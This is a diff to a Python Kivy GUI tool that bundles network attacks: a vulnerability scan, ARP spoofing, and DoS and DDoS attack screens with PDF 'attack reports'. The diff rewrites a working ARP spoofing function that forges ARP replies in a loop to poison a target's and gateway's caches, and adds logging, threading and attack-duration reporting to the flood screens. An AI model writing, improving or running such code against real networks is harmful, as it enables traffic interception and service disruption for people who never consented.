@@ -6,6 +6,7 @@ import time
 import threading
 import socket
 import random
+import queue
 import ctypes
 import platform
 import nmap
@@ -347,42 +348,59 @@ def vulnerability_scan_ui(target):
 # =============================
 # ARP SPOOFING FUNCTION
 # =============================
-def arp_spoofing(target_ip, gateway_ip, interval=0.5, stop_event=None):
-    target_mac = getmacbyip(target_ip)
-    gateway_mac = getmacbyip(gateway_ip)
+def arp_spoofing(target_ip, gateway_ip, interval=0.5, stop_event=None, log_queue=None):
+    """
+    ARP Spoofing function with enhanced logging
+    """
+    try:
+        # Resolve MAC addresses
+        target_mac = getmacbyip(target_ip)
+        gateway_mac = getmacbyip(gateway_ip)
 
-    if not target_mac or not gateway_mac:
-        print("[-] Failed to get MAC addresses")
-        return
+        if not target_mac or not gateway_mac:
+            log_queue.put(f"[-] Failed to resolve MAC addresses for {target_ip} or {gateway_ip}")
+            return
 
-    print(f"[+] Resolved Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")
+        log_queue.put(f"[+] Resolved Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")
 
-    # Build spoofed ARP packets
-    pkt_to_target = Ether(dst=target_mac) / ARP(
-        op=2,  # ARP reply
-        pdst=target_ip,
-        hwdst=target_mac,
-        psrc=gateway_ip,
-        hwsrc=gateway_mac,
-    )
+        # Build spoofed ARP packets
+        pkt_to_target = Ether(dst=target_mac) / ARP(
+            op=2,  # ARP reply
+            pdst=target_ip,
+            hwdst=target_mac,
+            psrc=gateway_ip,
+            hwsrc=gateway_mac,
+        )
 
-    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
-        op=2,  # ARP reply
-        pdst=gateway_ip,
-        hwdst=gateway_mac,
-        psrc=target_ip,
-        hwsrc=target_mac,
-    )
+        pkt_to_gateway = Ether(dst=gateway_mac) / ARP(
+            op=2,  # ARP reply
+            pdst=gateway_ip,
+            hwdst=gateway_mac,
+            psrc=target_ip,
+            hwsrc=target_mac,
+        )
 
-    # Send spoofed packets more frequently for increased chance to overwrite the ARP cache
-    while not stop_event.is_set():
-        sendp(pkt_to_target, verbose=False)
-        sendp(pkt_to_gateway, verbose=False)
-        # Sleep interval to control the spoofing frequency
-        time.sleep(interval)
+        total_packets_sent = 0
 
-    print("[*] ARP spoofing thread exiting cleanly.")
+        # Main spoofing loop
+        while not stop_event.is_set():
+            sendp(pkt_to_target, verbose=False)
+            sendp(pkt_to_gateway, verbose=False)
+            
+            total_packets_sent += 2
+            log_queue.put(f"[+] Sent ARP spoof to {target_ip} and {gateway_ip} (Total: {total_packets_sent})")
+            
+            # Sleep with periodic checks for stop_event
+            elapsed = 0.0
+            while elapsed < interval and not stop_event.is_set():
+                time.sleep(0.1)
+                elapsed += 0.1
 
+    except Exception as e:
+        log_queue.put(f"[-] Error in ARP spoofing: {str(e)}")
+    finally:
+        # Clean exit message
+        log_queue.put("[*] ARP spoofing thread exited")
 
 # =============================
 # DOS ATTACK FUNCTIONS
@@ -705,6 +723,13 @@ class ScanningScreen(Screen):
 class ARPSpoofScreen(Screen):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
+        self.log_queue = queue.Queue()  # Add this line
+
+        # Spoofing control
+        self.stop_event = threading.Event()
+        self.thread = None
+
+        Clock.schedule_interval(self.update_output, 0.5)
 
         layout = FloatLayout()
 
@@ -795,9 +820,15 @@ class ARPSpoofScreen(Screen):
         layout.add_widget(content)
         self.add_widget(layout)
 
-        # Spoofing control
-        self.stop_event = threading.Event()
-        self.thread = None
+    def update_output(self, dt):
+        """Update UI with new log messages"""
+        while not self.log_queue.empty():
+            message = self.log_queue.get()
+            self.info.text += "\n" + message
+
+        # # Spoofing control
+        # self.stop_event = threading.Event()
+        # self.thread = None
 
     def start_spoof(self, instance):
         target = self.target_input.text.strip()
@@ -821,14 +852,14 @@ class ARPSpoofScreen(Screen):
             self.info.text += "\n[!] ARP Spoofing already in progress."
             return
 
-        self.stop_event.clear()
+        self.stop_event.clear()  # Clear the existing event
         self.thread = threading.Thread(
-            target=arp_spoofing, args=(target, gateway, interval, self.stop_event)
+            target=arp_spoofing, 
+            args=(target, gateway, interval, self.stop_event, self.log_queue)
         )
+        self.thread.daemon = True
         self.thread.start()
-        self.info.text = (
-            f"[*] ARP Spoofing started on {target}... (Interval: {interval}s)"
-        )
+        self.info.text += f"\n[*] ARP Spoofing started on {target}... (Interval: {interval}s)"
 
     def stop_spoof(self, instance):
         self.stop_event.set()
@@ -996,7 +1027,7 @@ def start_dos(self, instance):
         self.info.text += "\n[*] DoS attack stopped."
 
     def update_output(self, dt):
-        self.info.text += f"\n[+] Packets sent: {self.packet_counter[0]}"
+        self.info.text += f"\n[+] Performing Attack - Sending Packets : {self.packet_counter[0]}"
 
     def export_results(self, instance):
         if hasattr(self, 'info') and self.info.text and self.info.text != "DoS Output...":
@@ -1011,9 +1042,6 @@ def start_dos(self, instance):
                 self.info.text += f"\n[-] Failed to export report: {e}"
         else:
             self.info.text += "\n[-] No results to export"
-
-
-
 
 class DOSAttackScreen(Screen):
     def __init__(self, **kwargs):
@@ -1114,6 +1142,7 @@ class DOSAttackScreen(Screen):
 
         self.packet_counter[0] = 0
         self.stop_event.clear()
+        self.start_time = time.time()  # Initialize start_time
 
         self.update_event = Clock.schedule_interval(self.update_output, 1)
 
@@ -1123,7 +1152,7 @@ class DOSAttackScreen(Screen):
             daemon=True,
         ).start()
 
-        self.info.text = "[*] DoS attack started..."
+        self.info.text = f"[*] DoS attack started against {target}:{port}"
 
     def stop_dos(self, instance):
         self.stop_event.set()
@@ -1132,15 +1161,21 @@ class DOSAttackScreen(Screen):
         self.info.text += "\n[*] DoS attack stopped."
 
     def update_output(self, dt):
-        self.info.text += f"\n[+] Packets sent: {self.packet_counter[0]}"
+        self.info.text += f"\n[+] Performing Attack - Sending Packets : {self.packet_counter[0]}"
 
     def export_results(self, instance):
         if hasattr(self, 'info') and self.info.text and self.info.text != "DoS Output...":
             try:
-                elapsed = time.time() - self.start_time if hasattr(self, "start_time") else 0
+                if hasattr(self, "start_time"):
+                    elapsed = time.time() - self.start_time
+                else:
+                    elapsed = 0
+                
                 total_packets = self.packet_counter[0] if hasattr(self, "packet_counter") else "N/A"
+                
                 extra_info = f"\n\n[Report Summary]\nTotal Packets Sent: {total_packets}\nAttack Duration: {elapsed:.2f} seconds"
                 full_report = self.info.text + extra_info
+                
                 filename = export_to_pdf(full_report, "dos_attack")
                 self.info.text += f"\n[+] Report exported to {filename}"
             except Exception as e:
@@ -1154,6 +1189,9 @@ class DDoSAttackScreen(Screen):
         self.stop_event = threading.Event()
         self.packet_counter = [0]
         self.update_event = None
+        self.start_time = None
+        self.attack_target = None
+        self.attack_port = None
 
         layout = FloatLayout()
 
@@ -1166,7 +1204,7 @@ class DDoSAttackScreen(Screen):
         )
         layout.add_widget(bg)
 
-        # Glass content container
+        # Content container
         content = BoxLayout(
             orientation="vertical",
             spacing=10,
@@ -1175,7 +1213,7 @@ class DDoSAttackScreen(Screen):
             pos_hint={"center_x": 0.5, "center_y": 0.5},
         )
 
-        # Output field
+        # Output display
         self.info = TextInput(
             text="DDoS Output...",
             readonly=True,
@@ -1188,7 +1226,7 @@ class DDoSAttackScreen(Screen):
         )
         content.add_widget(self.info)
 
-        # Inputs
+        # Input fields
         self.target_input = TextInput(
             hint_text="Enter target IP",
             size_hint=(1, 0.1),
@@ -1264,6 +1302,9 @@ class DDoSAttackScreen(Screen):
 
         self.packet_counter[0] = 0
         self.stop_event.clear()
+        self.start_time = time.time()
+        self.attack_target = target
+        self.attack_port = port
 
         self.update_event = Clock.schedule_interval(self.update_output, 1)
 
@@ -1274,7 +1315,7 @@ class DDoSAttackScreen(Screen):
                 daemon=True,
             ).start()
 
-        self.info.text = "[*] DDoS attack started..."
+        self.info.text = f"[*] DDoS attack started on {target}:{port} with {threads} threads."
 
     def stop_ddos(self, instance):
         self.stop_event.set()
@@ -1283,14 +1324,21 @@ class DDoSAttackScreen(Screen):
         self.info.text += "\n[*] DDoS attack stopped."
 
     def update_output(self, dt):
-        self.info.text += f"\n[+] Packets sent: {self.packet_counter[0]}"
+        self.info.text += f"\n[+] Performing Attack - Sending Packets: {self.packet_counter[0]}"
 
     def export_results(self, instance):
         if hasattr(self, 'info') and self.info.text and self.info.text != "DDoS Output...":
             try:
-                elapsed = time.time() - self.start_time if hasattr(self, "start_time") else 0
-                total_packets = self.packet_counter[0] if hasattr(self, "packet_counter") else "N/A"
-                extra_info = f"\n\n[Report Summary]\nTotal Packets Sent: {total_packets}\nAttack Duration: {elapsed:.2f} seconds"
+                elapsed = time.time() - self.start_time if self.start_time else 0
+                total_packets = self.packet_counter[0]
+                target = self.attack_target or "Unknown"
+                port = self.attack_port or "Unknown"
+                extra_info = (
+                    f"\n\n[Report Summary]"
+                    f"\nTarget: {target}:{port}"
+                    f"\nTotal Packets Sent: {total_packets}"
+                    f"\nAttack Duration: {elapsed:.2f} seconds"
+                )
                 full_report = self.info.text + extra_info
                 filename = export_to_pdf(full_report, "ddos_attack")
                 self.info.text += f"\n[+] Report exported to {filename}"
@@ -1305,34 +1353,26 @@ class DDoSAttackScreen(Screen):
 # =============================
 def export_to_pdf(content, report_type):
     """Export text content to a PDF file"""
-    # Create reports directory if it doesn't exist
     if not os.path.exists("reports"):
         os.makedirs("reports")
-    
-    # Generate filename with timestamp
+
     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"reports/{report_type}_report_{timestamp}.pdf"
-    
-    # Create PDF
+
     doc = SimpleDocTemplate(filename, pagesize=letter)
     styles = getSampleStyleSheet()
     story = []
-    
-    # Add title
+
     title = f"{report_type.capitalize()} Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     story.append(Paragraph(title, styles['Title']))
-    
-    # Add content - split by lines and create paragraphs
+
     for line in content.split('\n'):
-        if line.strip():  # Skip empty lines
-            # Escape special characters for PDF
+        if line.strip():
             line = line.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
             story.append(Paragraph(line, styles['Normal']))
-    
-    # Build PDF
+
     doc.build(story)
     return filename
-
 
 # =============================
 # MAIN APP
